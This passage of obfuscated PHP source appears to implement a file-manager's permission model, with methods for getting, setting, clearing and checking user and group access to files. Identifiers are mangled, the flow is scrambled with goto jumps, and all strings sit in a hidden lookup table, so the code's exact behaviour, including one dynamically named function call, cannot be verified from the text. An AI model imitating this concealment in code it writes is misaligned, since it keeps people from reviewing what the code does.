= $_SERVER[Æ¼ôºÙï][1021]; goto F´¤òîå…; Aø‰äœ¯”­: $DŞ‰Ä´¬£ = $_SERVER[Æ¼ôºÙï][815]; $a˜æ‚†¨ñ  = $_SERVER[$_SERVER[Æ¼ôºÙï][816]] . $_SERVER[Æ¼ôºÙï][817]; $EÂˆ¸„…‘ë = $DŞ‰Ä´¬£($a˜æ‚†¨ñ ); goto A·ä›Æ§£; F´¤òîå…: $B£°İĞù—¤($D¹Å¼¥‘”); goto Fñ÷ô¡†Ÿ; Fñ÷ô¡†Ÿ: } goto eÒåƒ¯«‰; FùêÈéÀÈÁ: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\x72\x63\x65\x5f\x61\165\164\x68"; public function getAuth($e“ó¹ãÒÙÜ) { goto e°ÂØÈ‚Š¹; b†£®ª: array_multisort($A½é¯Ììç, SORT_DESC, $fóÓÂ–‰éù); return $fóÓÂ–‰éù; goto B•«÷éº¼; e°ÂØÈ‚Š¹: $e‰ÑÂÃ»š‚ =& $_SERVER[Æ¼ôºÙï]; $Fäš·µ¦¯¾ = $this->sourceAuthSelect($e“ó¹ãÒÙÜ); $fóÓÂ–‰éù = array(); goto c®ù‰¿¬‚; c®ù‰¿¬‚: $A½é¯Ììç = array(); $f¾°Ü´Õ = 2 << 25; foreach ($Fäš·µ¦¯¾ as $d ‘ö…È–) { goto eğ¹¤ÏÛñ; eğ¹¤ÏÛñ: $a‘—õ’ºÉ  = Model($e‰ÑÂÃ»š‚[1830])->listData($d ‘ö…È–[$e‰ÑÂÃ»š‚[1811]]); if (!$a‘—õ’ºÉ ) { continue; } $fóÓÂ–‰éù[] = $d ‘ö…È–; goto dä‡­Ïîóô; B«Ğ…™º‘: if ($d ‘ö…È–[$e‰ÑÂÃ»š‚[389]] == SourceModel::TYPE_USER && $d ‘ö…È–[$e‰ÑÂÃ»š‚[474]] == $e‰ÑÂÃ»š‚[486]) { $B°é‡‹ØÈ¯ = 0; } $A½é¯Ììç[] = $a‘—õ’ºÉ [$e‰ÑÂÃ»š‚[394]] + $B°é‡‹ØÈ¯; goto aâ·«†‘‡ª; dä‡­Ïîóô: $B°é‡‹ØÈ¯ = 0; if ($d ‘ö…È–[$e‰ÑÂÃ»š‚[389]] == SourceModel::TYPE_GROUP) { $B°é‡‹ØÈ¯ = $f¾°Ü´Õ * 2; } if ($d ‘ö…È–[$e‰ÑÂÃ»š‚[389]] == SourceModel::TYPE_USER) { $B°é‡‹ØÈ¯ = $f¾°Ü´Õ; } goto B«Ğ…™º‘; aâ·«†‘‡ª: } goto b†£®ª; B•«÷éº¼: } public function sourceAuthSelect($d×Õ°’Âìß) { goto f¡“İ”¢Ï£; f¡“İ”¢Ï£: $e‹¶ƒ„–ˆ =& $_SERVER[Æ¼ôºÙï]; static $fùÈ±‰ÛîÒ = array(); $Fœ„„£ÔŠ = is_array($d×Õ°’Âìß) ? !1 : !0; goto aÕÌÅç·; DÇ›‘õËÁÀ: if ($Fœ„„£ÔŠ) { return $a–·¸Äôô“; } return $fò—“æà´‡; goto AÉ•øùÁ‚; aÕÌÅç·: if ($Fœ„„£ÔŠ) { $d×Õ°’Âìß = array($d×Õ°’Âìß); } $däÑùÉ¶¬í = array(); foreach ($d×Õ°’Âìß as $dôÎ²„´ª) { if (isset($fùÈ±‰ÛîÒ[$dôÎ²„´ª])) { $däÑùÉ¶¬í[$dôÎ²„´ª] = $fùÈ±‰ÛîÒ[$dôÎ²„´ª]; } } goto A÷Õà¼ïƒ¬; FÒĞÉ•¥ä«: $a–·¸Äôô“ = $this->field($E‘ŠÃŸã¤Û)->order($e‹¶ƒ„–ˆ[385])->where($föòí¡’ÚÛ)->select(); $fò—“æà´‡ = array_to_keyvalue_group($a–·¸Äôô“, $e‹¶ƒ„–ˆ[387]); foreach ($d×Õ°’Âìß as $dôÎ²„´ª) { $fùÈ±‰ÛîÒ[$dôÎ²„´ª] = $fò—“æà´‡[$dôÎ²„´ª] ? $fò—“æà´‡[$dôÎ²„´ª] : array(); } goto DÇ›‘õËÁÀ; A÷Õà¼ïƒ¬: if (count($däÑùÉ¶¬í) == count($d×Õ°’Âìß)) { return $Fœ„„£ÔŠ ? $däÑùÉ¶¬í[$d×Õ°’Âìß[0]] : $däÑùÉ¶¬í; } $E‘ŠÃŸã¤Û = $e‹¶ƒ„–ˆ[1831]; $föòí¡’ÚÛ = array($e‹¶ƒ„–ˆ[387] => array($e‹¶ƒ„–ˆ[7], $d×Õ°’Âìß)); goto FÒĞÉ•¥ä«; AÉ•øùÁ‚: } public function setAuth($dåˆ¡ìÇç‚, $a“Â·‘¯Ğ) { goto B„Ê—›Œùã; e‹—‘à†½¾: if ($eÒæÖĞ©‡[$dÍÓ¦Æ‹Ô”[389]] != SourceModel::TYPE_GROUP) { return !1; } $A¡”¸¤‚£ = 1; $b‚…çˆ¼‡½ = $eÒæÖĞ©‡[$dÍÓ¦Æ‹Ô”[474]]; goto FİÚ´Å¹¯; FİÚ´Å¹¯: if ($b‚…çˆ¼‡½ != $A¡”¸¤‚£) { $eœ©ñ…Å = array($dÍÓ¦Æ‹Ô”[1661] => $b‚…çˆ¼‡½); $d®‚”Üğªå = Model($dÍÓ¦Æ‹Ô”[1745])->field($dÍÓ¦Æ‹Ô”[1502])->where($eœ©ñ…Å)->select(); $d®‚”Üğªå = array_to_keyvalue($d®‚”Üğªå, $dÍÓ¦Æ‹Ô”[33], $dÍÓ¦Æ‹Ô”[1502]); } $aŞƒÃÎ´æÈ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $A¨‡ÈòŠÄÁ = array(); goto eß°ØÔóÇŠ; d‡ï©‹Ô: return !0; goto d®ºê êä; eß°ØÔóÇŠ: foreach ($a“Â·‘¯Ğ as $f©ÓÑ’ç•ï) { if (!in_array($f©ÓÑ’ç•ï[$dÍÓ¦Æ‹Ô”[389]], $aŞƒÃÎ´æÈ)) { show_json(LNG($dÍÓ¦Æ‹Ô”[1832]), !1); } if ($b‚…çˆ¼‡½ != $A¡”¸¤‚£) { if ($f©ÓÑ’ç•ï[$dÍÓ¦Æ‹Ô”[389]] == SourceModel::TYPE_GROUP) { } if ($f©ÓÑ’ç•ï[$dÍÓ¦Æ‹Ô”[474]] != 0 && !in_array($f©ÓÑ’ç•ï[$dÍÓ¦Æ‹Ô”[474]], $d®‚”Üğªå)) { } } if ($f©ÓÑ’ç•ï[$dÍÓ¦Æ‹Ô”[474]] == 0) { $f©ÓÑ’ç•ï[$dÍÓ¦Æ‹Ô”[389]] = SourceModel::TYPE_USER; } $A¨‡ÈòŠÄÁ[] = array($dÍÓ¦Æ‹Ô”[387] => $dåˆ¡ìÇç‚, $dÍÓ¦Æ‹Ô”[389] => intval($f©ÓÑ’ç•ï[$dÍÓ¦Æ‹Ô”[389]]), $dÍÓ¦Æ‹Ô”[474] => intval($f©ÓÑ’ç•ï[$dÍÓ¦Æ‹Ô”[474]]), $dÍÓ¦Æ‹Ô”[1811] => intval($f©ÓÑ’ç•ï[$dÍÓ¦Æ‹Ô”[1811]]) ? intval($f©ÓÑ’ç•ï[$dÍÓ¦Æ‹Ô”[1811]]) : 0, $dÍÓ¦Æ‹Ô”[1812] => intval($f©ÓÑ’ç•ï[$dÍÓ¦Æ‹Ô”[1812]]) ? intval($f©ÓÑ’ç•ï[$dÍÓ¦Æ‹Ô”[1812]]) : -1); } $this->where(array($dÍÓ¦Æ‹Ô”[401] => $dåˆ¡ìÇç‚))->delete(); $this->addAll($A¨‡ÈòŠÄÁ); goto d‡ï©‹Ô; B„Ê—›Œùã: $dÍÓ¦Æ‹Ô” =& $_SERVER[Æ¼ôºÙï]; $eÒæÖĞ©‡ = Model($dÍÓ¦Æ‹Ô”[1182])->sourceInfo($dåˆ¡ìÇç‚); if (!$eÒæÖĞ©‡) { return !1; } goto e‹—‘à†½¾; d®ºê êä: } public function authClear($d¬ÉÖé¾æ“) { $CàâÅßó« =& $_SERVER[Æ¼ôºÙï]; $E†İ•‹“–è = Model($CàâÅßó«[1182])->sourceInfo($d¬ÉÖé¾æ“); $bİã¿ÕôˆÎ = array($d¬ÉÖé¾æ“); if ($E†İ•‹“–è[$CàâÅßó«[388]] == $CàâÅßó«[86]) { $b£ëÅå…” = array($CàâÅßó«[542] => array($CàâÅßó«[501], $E†İ•‹“–è[$CàâÅßó«[477]] . $d¬ÉÖé¾æ“ . $CàâÅßó«[502])); $bİã¿ÕôˆÎ = Model($CàâÅßó«[1182])->field($CàâÅßó«[401])->where($b£ëÅå…”)->getField($CàâÅßó«[387], !0); $bİã¿ÕôˆÎ[] = $d¬ÉÖé¾æ“; } $this->where(array($CàâÅßó«[401] => array($CàâÅßó«[402], $bİã¿ÕôˆÎ)))->delete(); return !0; } public function getAllChildren($fŞæ·†„é) { goto e”šƒÏñĞÃ; CëÅööÒÔà: if ($d‹Îğ°–‹†[$cš‰Šô…÷ï[479]] == $cš‰Šô…÷ï[486] && $d‹Îğ°–‹†[$cš‰Šô…÷ï[474]] != $bŠœË¼¯Ñ—) { $dŸá¸ßÎÕĞ = $this->groupChidldAllRootSource($d‹Îğ°–‹†[$cš‰Šô…÷ï[474]]); } $DÄÃÉ­»¶ = $this->field($cš‰Šô…÷ï[387])->group($cš‰Šô…÷ï[387])->select(); $DÄÃÉ­»¶ = array_to_keyvalue($DÄÃÉ­»¶, $cš‰Šô…÷ï[33], $cš‰Šô…÷ï[387]); goto BøÖšæÑŞ; BøÖšæÑŞ: if (!$DÄÃÉ­»¶) { return array(); } $C½—Ñ¶Ã™« = $cš‰Šô…÷ï[1833]; $aŠ¼‘“è¬ï = array($cš‰Šô…÷ï[387] => array($cš‰Šô…÷ï[7], $DÄÃÉ­»¶), $cš‰Šô…÷ï[414] => $cš‰Šô…÷ï[486]); goto EğËÉ Ş„Ñ; EğËÉ Ş„Ñ: $cÀ„‰ˆåÄ‚ = Model($cš‰Šô…÷ï[770])->field($C½—Ñ¶Ã™«)->where($aŠ¼‘“è¬ï)->select(); $Cº›ÎåŒ½˜ = array($fŞæ·†„é); foreach ($cÀ„‰ˆåÄ‚ as $aĞë¢ˆ–î¥) { foreach ($dŸá¸ßÎÕĞ as $E‡©Ó£‚™ğ) { $F¹ê™Ö‰ = $cš‰Šô…÷ï[47] . $E‡©Ó£‚™ğ . $cš‰Šô…÷ï[47]; $Cö¢å­‰À• = $aĞë¢ˆ–î¥[$cš‰Šô…÷ï[477]] . $aĞë¢ˆ–î¥[$cš‰Šô…÷ï[387]] . $cš‰Šô…÷ï[47]; if (strstr($Cö¢å­‰À•, $F¹ê™Ö‰)) { $Cº›ÎåŒ½˜[] = $aĞë¢ˆ–î¥[$cš‰Šô…÷ï[387]]; break; } } } goto d‘Šß£ï¶¶; d‘Šß£ï¶¶: return $this->sourceListAuth($Cº›ÎåŒ½˜); goto f¬æà‰Â—ë; e”šƒÏñĞÃ: $cš‰Šô…÷ï =& $_SERVER[Æ¼ôºÙï]; $d‹Îğ°–‹† = Model($cš‰Šô…÷ï[1182])->sourceInfo($fŞæ·†„é); if ($d‹Îğ°–‹†[$cš‰Šô…÷ï[388]] != $cš‰Šô…÷ï[86]) { return $this->sourceListAuth(array($fŞæ·†„é)); } goto Dºò÷×Ú®ƒ; Dºò÷×Ú®ƒ: if ($d‹Îğ°–‹†[$cš‰Šô…÷ï[389]] != SourceModel::TYPE_GROUP) { return array(); } $bŠœË¼¯Ñ— = 1; $dŸá¸ßÎÕĞ = array($fŞæ·†„é); goto CëÅööÒÔà; f¬æà‰Â—ë: } private function sourceListAuth($D¥¥«´§Æø) { goto FÈÁœÃ¦†; eá®¬ï¼Ô: array_multisort($Cé—œáùÇ, SORT_ASC, $dËÖµ¹â«º); return $dËÖµ¹â«º; goto B¾Àæœˆ’; FÈÁœÃ¦†: $DÜÛ‘îäË =& $_SERVER[Æ¼ôºÙï]; $bëªõÃ„· = Model($DÜÛ‘îäË[1182])->sourceListInfo($D¥¥«´§Æø, !0); $f²†”ÁŒô‰ = $this->sourceAuthSelect($D¥¥«´§Æø); goto bÕË©’–Â; bÕË©’–Â: $dËÖµ¹â«º = array(); $Cé—œáùÇ = array(); foreach ($bëªõÃ„· as $C’ÎÖÓ„òÆ) { goto dÓ³ÕßÒ…³; B¤—à±îŒã: unset($C’ÎÖÓ„òÆ[$DÜÛ‘îäË[84]]); $Dã½¤ÔÜæà = $f²†”ÁŒô‰[$C’ÎÖÓ„òÆ[$DÜÛ‘îäË[387]]]; if (!$Dã½¤ÔÜæà) { continue; } goto fïØÆĞÕ; dÓ³ÕßÒ…³: unset($C’ÎÖÓ„òÆ[$DÜÛ‘îäË[397]]); unset($C’ÎÖÓ„òÆ[$DÜÛ‘îäË[396]]); unset($C’ÎÖÓ„òÆ[$DÜÛ‘îäË[394]]); goto B¤—à±îŒã; CÀ À¦ˆ¥©: $f®Ëó¸Ç«æ = count(explode($DÜÛ‘îäË[8], trim($C’ÎÖÓ„òÆ[$DÜÛ‘îäË[484]], $DÜÛ‘îäË[8]))); $Cé—œáùÇ[] = $f®Ëó¸Ç«æ + ($C’ÎÖÓ„òÆ[$DÜÛ‘îäË[29]] == $DÜÛ‘îäË[76] ? 0 : 1000); goto EñÔ¬„¿°¿; fïØÆĞÕ: $C’ÎÖÓ„òÆ[$DÜÛ‘îäË[1834]] = $this->authTargetInfo($Dã½¤ÔÜæà); $C’ÎÖÓ„òÆ[$DÜÛ‘îäË[484]] = rtrim($C’ÎÖÓ„òÆ[$DÜÛ‘îäË[480]], $DÜÛ‘îäË[8]) . $DÜÛ‘îäË[8] . ltrim($C’ÎÖÓ„òÆ[$DÜÛ‘îäË[484]], $DÜÛ‘îäË[8]); $dËÖµ¹â«º[] = $C’ÎÖÓ„òÆ; goto CÀ À¦ˆ¥©; EñÔ¬„¿°¿: } goto eá®¬ï¼Ô; B¾Àæœˆ’: } private function groupChidldAllRootSource($BÈÇãÀ›Ú’) { $BâØ¢Å›Ğ =& $_SERVER[Æ¼ôºÙï]; $C©¿—œ¹æ = Model($BâØ¢Å›Ğ[1835])->groupChildrenAll($BÈÇãÀ›Ú’); $f‡É¥ÕÛÛ° = array($BâØ¢Å›Ğ[479] => 0, $BâØ¢Å›Ğ[474] => array($BâØ¢Å›Ğ[7], $C©¿—œ¹æ), $BâØ¢Å›Ğ[389] => SourceModel::TYPE_GROUP); $d¦¥™Û£Ù¨ = Model($BâØ¢Å›Ğ[770])->field($BâØ¢Å›Ğ[387])->where($f‡É¥ÕÛÛ°)->select(); $d¦¥™Û£Ù¨ = array_to_keyvalue($d¦¥™Û£Ù¨, $BâØ¢Å›Ğ[33], $BâØ¢Å›Ğ[387]); return $d¦¥™Û£Ù¨; } private function authTargetInfo($dÍåˆ„¥¦) { goto e‰ä‘ñŠ›å; e‰ä‘ñŠ›å: $D¶ô©¼èà =& $_SERVER[Æ¼ôºÙï]; $f„¤ÙÛğØ = array(); $AåêğÈÑ¾Í = array(); goto DùŞœÆì¶§; DùŞœÆì¶§: $F´İÂ‚…İé = 2 << 25; foreach ($dÍåˆ„¥¦ as $A±ÍÖÛéÄ’) { goto dèù¾§òÇ¦; dèù¾§òÇ¦: $Cë•’ øÀ = Model($D¶ô©¼èà[1830])->listData($A±ÍÖÛéÄ’[$D¶ô©¼èà[1811]]); if (!$Cë•’ øÀ) { continue; } if ($A±ÍÖÛéÄ’[$D¶ô©¼èà[389]] == SourceModel::TYPE_USER) { $d§À¨ÂŞ¼‡ = Model($D¶ô©¼èà[492])->getInfoSimpleOuter($A±ÍÖÛéÄ’[$D¶ô©¼èà[474]]); if ($d§À¨ÂŞ¼‡[$D¶ô©¼èà[1502]] == $D¶ô©¼èà[1064]) { continue; } if ($d§À¨ÂŞ¼‡[$D¶ô©¼èà[1502]] == $D¶ô©¼èà[486]) { $d§À¨ÂŞ¼‡[$D¶ô©¼èà[28]] = LNG($D¶ô©¼èà[1836]); } } else { $d§À¨ÂŞ¼‡ = Model($D¶ô©¼èà[476])->getInfoSimple($A±ÍÖÛéÄ’[$D¶ô©¼èà[474]]); } goto D›Î³Ğ­×; bªƒÔ¡‡§º: if ($A±ÍÖÛéÄ’[$D¶ô©¼èà[389]] == SourceModel::TYPE_USER && $A±ÍÖÛéÄ’[$D¶ô©¼èà[474]] == $D¶ô©¼èà[486]) { $bÑ®™ÙğÂ = 0; } $AåêğÈÑ¾Í[] = $Cë•’ øÀ[$D¶ô©¼èà[394]] + $bÑ®™ÙğÂ; goto B¹–ô¿§†ˆ; D›Î³Ğ­×: if (!$d§À¨ÂŞ¼‡) { continue; } $d§À¨ÂŞ¼‡[$D¶ô©¼èà[435]] = $Cë•’ øÀ; $f„¤ÙÛğØ[] = $d§À¨ÂŞ¼‡; goto F¢à£Ò¼ƒ; F¢à£Ò¼ƒ: $bÑ®™ÙğÂ = 0; if ($A±ÍÖÛéÄ’[$D¶ô©¼èà[389]] == SourceModel::TYPE_GROUP) { $bÑ®™ÙğÂ = $F´İÂ‚…İé * 2; } if ($A±ÍÖÛéÄ’[$D¶ô©¼èà[389]] == SourceModel::TYPE_USER) { $bÑ®™ÙğÂ = $F´İÂ‚…İé; } goto bªƒÔ¡‡§º; B¹–ô¿§†ˆ: } array_multisort($AåêğÈÑ¾Í, SORT_DESC, $f„¤ÙÛğØ); goto FÉ§ì÷‰¬ò; FÉ§ì÷‰¬ò: return $f„¤ÙÛğØ; goto aƒ™¥Äè Ú; aƒ™¥Äè Ú: } public function getAllChildrenByUser($FÛÚÚ‡ÛŠê, $e¢”ºÜ–«•) { goto eÀÜ×ã³‡Â; f„ó„å¼¬ª: if ($E„¯ÒÌÎµ±[$C‹ÈŠĞ£’È[479]] == $C‹ÈŠĞ£’È[486] && $E„¯ÒÌÎµ±[$C‹ÈŠĞ£’È[474]] != $EÚïØÁÑÜÔ && $this->groupContainUser($E„¯ÒÌÎµ±[$C‹ÈŠĞ£’È[474]], $e¢”ºÜ–«•)) { foreach ($AºÌ·ÍˆÑÆ[$C‹ÈŠĞ£’È[1837]] as $FİµñŞŠãÂ) { $e×ôîÊõÓ = Model($C‹ÈŠĞ£’È[476])->getInfo($FİµñŞŠãÂ[$C‹ÈŠĞ£’È[1661]]); $a‹²ùÅ‰ßá = Model($C‹ÈŠĞ£’È[495])->getInfoSimpleOuter($e¢”ºÜ–«•); $a‹²ùÅ‰ßá[$C‹ÈŠĞ£’È[435]] = $FİµñŞŠãÂ[$C‹ÈŠĞ£’È[394]]; if (Model($C‹ÈŠĞ£’È[1830])->authCheckAction($FİµñŞŠãÂ[$C‹ÈŠĞ£’È[394]][$C‹ÈŠĞ£’È[394]], $C‹ÈŠĞ£’È[1681])) { continue; } $fÑïŞÕá = array($C‹ÈŠĞ£’È[28] => $C‹ÈŠĞ£’È[1454] . $e×ôîÊõÓ[$C‹ÈŠĞ£’È[28]], $C‹ÈŠĞ£’È[387] => $e×ôîÊõÓ[$C‹ÈŠĞ£’È[84]][$C‹ÈŠĞ£’È[387]], $C‹ÈŠĞ£’È[75] => KodIO::make($e×ôîÊõÓ[$C‹ÈŠĞ£’È[84]][$C‹ÈŠĞ£’È[387]]), $C‹ÈŠĞ£’È[479] => $C‹ÈŠĞ£’È[486], $C‹ÈŠĞ£’È[389] => $C‹ÈŠĞ£’È[994], $C‹ÈŠĞ£’È[29] => $C‹ÈŠĞ£’È[506], $C‹ÈŠĞ£’È[484] => $e×ôîÊõÓ[$C‹ÈŠĞ£’È[481]], $C‹ÈŠĞ£’È[1661] => $e×ôîÊõÓ[$C‹ÈŠĞ£’È[1661]], $C‹ÈŠĞ£’È[478] => $e×ôîÊõÓ[$C‹ÈŠĞ£’È[479]], $C‹ÈŠĞ£’È[1834] => array($a‹²ùÅ‰ßá)); $dß§‚ô¤ÉÜ[$fÑïŞÕá[$C‹ÈŠĞ£’È[387]]] = $fÑïŞÕá; } } $CÑÛ§ï®ÔË = array(); $CøÕÌİ£‘ï = $this->getAllChildren($FÛÚÚ‡ÛŠê); goto EÅ½ÈÔÂ; EÅ½ÈÔÂ: foreach ($CøÕÌİ£‘ï as $B¢¤®‡“¾À) { $cÒ Ù›Û° = !1; foreach ($B¢¤®‡“¾À[$C‹ÈŠĞ£’È[1834]] as $Fñ´ö¢ å‹) { if ($Fñ´ö¢ å‹[$C‹ÈŠĞ£’È[1502]]) { if ($Fñ´ö¢ å‹[$C‹ÈŠĞ£’È[1502]] == $e¢”ºÜ–«•) { $cÒ Ù›Û° = !0; break; } } if ($Fñ´ö¢ å‹[$C‹ÈŠĞ£’È[1661]]) { if ($this->groupContainUser($Fñ´ö¢ å‹[$C‹ÈŠĞ£’È[1661]], $e¢”ºÜ–«•)) { $cÒ Ù›Û° = !0; break; } } } if ($cÒ Ù›Û°) { $CÑÛ§ï®ÔË[] = $B¢¤®‡“¾À; } $f»¤˜Ğ¦ç· = $B¢¤®‡“¾À[$C‹ÈŠĞ£’È[387]]; if (isset($dß§‚ô¤ÉÜ[$f»¤˜Ğ¦ç·])) { $B¢¤®‡“¾À[$C‹ÈŠĞ£’È[1834]][] = $dß§‚ô¤ÉÜ[$f»¤˜Ğ¦ç·][0]; $dß§‚ô¤ÉÜ[$f»¤˜Ğ¦ç·] = !1; } } $dß§‚ô¤ÉÜ = array_filter(array_values($dß§‚ô¤ÉÜ)); $CÑÛ§ï®ÔË = array_merge($dß§‚ô¤ÉÜ, $CÑÛ§ï®ÔË); goto dÚ¯ÚÚáÇ; Fµ¯Ô¦„ÍÔ: $E„¯ÒÌÎµ± = Model($C‹ÈŠĞ£’È[1182])->sourceInfo($FÛÚÚ‡ÛŠê); $dß§‚ô¤ÉÜ = array(); $EÚïØÁÑÜÔ = 1; goto f„ó„å¼¬ª; eÀÜ×ã³‡Â: $C‹ÈŠĞ£’È =& $_SERVER[Æ¼ôºÙï]; $AºÌ·ÍˆÑÆ = Model($C‹ÈŠĞ£’È[495])->getInfo($e¢”ºÜ–«•); if (!$e¢”ºÜ–«• || !$FÛÚÚ‡ÛŠê || !$AºÌ·ÍˆÑÆ) { return array(); } goto Fµ¯Ô¦„ÍÔ; dÚ¯ÚÚáÇ: return $CÑÛ§ï®ÔË; goto e¿‰§¨õÁ¥; e¿‰§¨õÁ¥: } public function setAllChildrenByUser($BÇƒÊÑë¯É, $C˜†š„¿œ½, $d»‹¥æÒŠì) { $dÊ¡Ä’ƒÓ =& $_SERVER[Æ¼ôºÙï]; $fµœ¹àëÙ— = $this->getAllChildrenByUser($BÇƒÊÑë¯É, $C˜†š„¿œ½); if (!$d»‹¥æÒŠì || !$fµœ¹àëÙ—) { return !1; } foreach ($fµœ¹àëÙ— as $cëçÆéÒ) { $E†ì†´‰›¯ = array(); foreach ($cëçÆéÒ[$dÊ¡Ä’ƒÓ[1834]] as $fÏÌÏÕÂÚß) { $e³ö£‰¡·† = $fÏÌÏÕÂÚß[$dÊ¡Ä’ƒÓ[435]]; $AêËÏ½Ôí = $fÏÌÏÕÂÚß[$dÊ¡Ä’ƒÓ[1502]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Fİøô‘Û¶Š = $fÏÌÏÕÂÚß[$dÊ¡Ä’ƒÓ[1502]] ? $fÏÌÏÕÂÚß[$dÊ¡Ä’ƒÓ[1502]] : $fÏÌÏÕÂÚß[$dÊ¡Ä’ƒÓ[1661]]; if ($fÏÌÏÕÂÚß[$dÊ¡Ä’ƒÓ[1502]] && $fÏÌÏÕÂÚß[$dÊ¡Ä’ƒÓ[1502]] == $C˜†š„¿œ½) { continue; } $E†ì†´‰›¯[] = array($dÊ¡Ä’ƒÓ[387] => $cëçÆéÒ[$dÊ¡Ä’ƒÓ[387]], $dÊ¡Ä’ƒÓ[389] => $AêËÏ½Ôí, $dÊ¡Ä’ƒÓ[474] => intval($Fİøô‘Û¶Š), $dÊ¡Ä’ƒÓ[1811] => isset($e³ö£‰¡·†[$dÊ¡Ä’ƒÓ[385]]) ? intval($e³ö£‰¡·†[$dÊ¡Ä’ƒÓ[385]]) : 0, $dÊ¡Ä’ƒÓ[1812] => isset($e³ö£‰¡·†[$dÊ¡Ä’ƒÓ[1812]]) ? intval($e³ö£‰¡·†[$dÊ¡Ä’ƒÓ[1812]]) : -1); } $E†ì†´‰›¯[] = array($dÊ¡Ä’ƒÓ[387] => $cëçÆéÒ[$dÊ¡Ä’ƒÓ[387]], $dÊ¡Ä’ƒÓ[389] => SourceModel::TYPE_USER, $dÊ¡Ä’ƒÓ[474] => intval($C˜†š„¿œ½), $dÊ¡Ä’ƒÓ[1811] => intval($d»‹¥æÒŠì), $dÊ¡Ä’ƒÓ[1812] => -1); $this->where(array($dÊ¡Ä’ƒÓ[401] => $cëçÆéÒ[$dÊ¡Ä’ƒÓ[387]]))->delete(); $this->addAll($E†ì†´‰›¯); } return !0; } public function get($b¶ĞµŠ°µã) { $cØõğŠˆˆ = $this->getSourceList(array($b¶ĞµŠ°µã), !0); return $cØõğŠˆˆ[0]; } public function getSourceList($CŸšÚƒ”¹Ï, $AïåĞ»‘‡Œ = false, $eÙá ¼Ü¡¡ = false) { goto b†‹¬±Î•Ÿ; cè†¿Öîêí: $Aäæ£¥ìåé = $this->sourceAuthSelect($FîŒ·Ò…¬§); $F”ğ¬»íéĞ = array(); foreach ($FîŒ·Ò…¬§ as $cÌ¦²ƒ‹¬¼) { if (isset($Aäæ£¥ìåé[$cÌ¦²ƒ‹¬¼])) { $F”ğ¬»íéĞ[$cÌ¦²ƒ‹¬¼] = $Aäæ£¥ìåé[$cÌ¦²ƒ‹¬¼]; } } goto fÙ¿÷Ÿ¸‘¸; fÔëâß¸Û: foreach ($AïåĞ»‘‡Œ as $f˜…ÉˆõÏª => $AÚ§»Ğ¶ß·) { $fÁÄ§·œ¬ = $cÍË’÷ˆòİ->parentLevelArray($AÚ§»Ğ¶ß·[$d¦ò®ùÖÂË[477]]); $FîŒ·Ò…¬§ = array_merge($FîŒ·Ò…¬§, array($f˜…ÉˆõÏª), array_reverse($fÁÄ§·œ¬)); } $FîŒ·Ò…¬§ = array_values(array_unique($FîŒ·Ò…¬§)); if (!$FîŒ·Ò…¬§) { return array(); } goto cè†¿Öîêí; f¨Ô‰ÔÈÀğ: $BŒ·Ä¥â±Î = array(); foreach ($AïåĞ»‘‡Œ as $cÌ¦²ƒ‹¬¼ => $F±‘Ø¾ó–Å) { if ($bËöŸ¯Æµ…) { $BŒ·Ä¥â±Î[$cÌ¦²ƒ‹¬¼] = $AìÈ§Ğ¬Ç; continue; } $BŒ·Ä¥â±Î[$cÌ¦²ƒ‹¬¼] = $this->makeSourceAuth($F±‘Ø¾ó–Å, $F”ğ¬»íéĞ, $eÙá ¼Ü¡¡); } return $BŒ·Ä¥â±Î; goto C‚¥Ûö¸Ø; D»½ğë‡ƒ: if (!$AïåĞ»‘‡Œ && count($CŸšÚƒ”¹Ï) == 1) { $AïåĞ»‘‡Œ = array(); $AïåĞ»‘‡Œ[$CŸšÚƒ”¹Ï[0]] = $cÍË’÷ˆòİ->sourceInfo($CŸšÚƒ”¹Ï[0]); } if (!$AïåĞ»‘‡Œ) { $EÌĞË„µŒì = array($d¦ò®ùÖÂË[401] => array($d¦ò®ùÖÂË[402], $CŸšÚƒ”¹Ï)); $AïåĞ»‘‡Œ = $cÍË’÷ˆòİ->field($d¦ò®ùÖÂË[1838])->where($EÌĞË„µŒì)->select(); $AïåĞ»‘‡Œ = array_to_keyvalue($AïåĞ»‘‡Œ, $d¦ò®ùÖÂË[387]); } $FîŒ·Ò…¬§ = $CŸšÚƒ”¹Ï; goto fÔëâß¸Û; fÙ¿÷Ÿ¸‘¸: $bËöŸ¯Æµ… = $this->userIsRoot($eÙá ¼Ü¡¡); $a˜¯­ îˆ = AuthModel::authAll(); $AìÈ§Ğ¬Ç = array($d¦ò®ùÖÂË[395] => $a˜¯­ îˆ, $d¦ò®ùÖÂË[1839] => array($d¦ò®ùÖÂË[403] => 0, $d¦ò®ùÖÂË[1667] => $a˜¯­ îˆ, $d¦ò®ùÖÂË[404] => LNG($d¦ò®ùÖÂË[1840]), $d¦ò®ùÖÂË[1682] => $d¦ò®ùÖÂË[1841])); goto f¨Ô‰ÔÈÀğ; b†‹¬±Î•Ÿ: $d¦ò®ùÖÂË =& $_SERVER[Æ¼ôºÙï]; if (!$CŸšÚƒ”¹Ï) { return array(); } $cÍË’÷ˆòİ = Model($d¦ò®ùÖÂË[1182]); goto D»½ğë‡ƒ; C‚¥Ûö¸Ø: } public function authDeepCheck($Bâß –´, $B„‘Ô­‰Â¿ = false) { goto cÅŸ‰Š¹Ä; a¼ˆ‚ß³”Š: if (!in_array($Bâß –´, $e—’ŞÎ‰®«[$EùÀ‰ñ×±À[1842]])) { return !1; } $D¤íÌùË™ø = array(); foreach ($e—’ŞÎ‰®«[$EùÀ‰ñ×±À[1843]] as $f›¼êï˜ë => $EíÕ¹•²•ƒ) { if (!in_array($Bâß –´, $EíÕ¹•²•ƒ)) { continue; } $D¤íÌùË™ø[] = $f›¼êï˜ë; } goto dî’Æ·ìèß; dî’Æ·ìèß: if (!$D¤íÌùË™ø) { return !1; } $d‡ÌÙ»‰ = $D¤íÌùË™ø ? $D¤íÌùË™ø[0] : $Bâß –´; return array($EùÀ‰ñ×±À[395] => -1, $EùÀ‰ñ×±À[435] => array($EùÀ‰ñ×±À[403] => $EùÀ‰ñ×±À[1064], $EùÀ‰ñ×±À[1667] => $EùÀ‰ñ×±À[486], $EùÀ‰ñ×±À[404] => LNG($EùÀ‰ñ×±À[1844]), $EùÀ‰ñ×±À[1682] => $EùÀ‰ñ×±À[1845]), $EùÀ‰ñ×±À[1846] => LNG($EùÀ‰ñ×±À[1847]), $EùÀ‰ñ×±À[1848] => 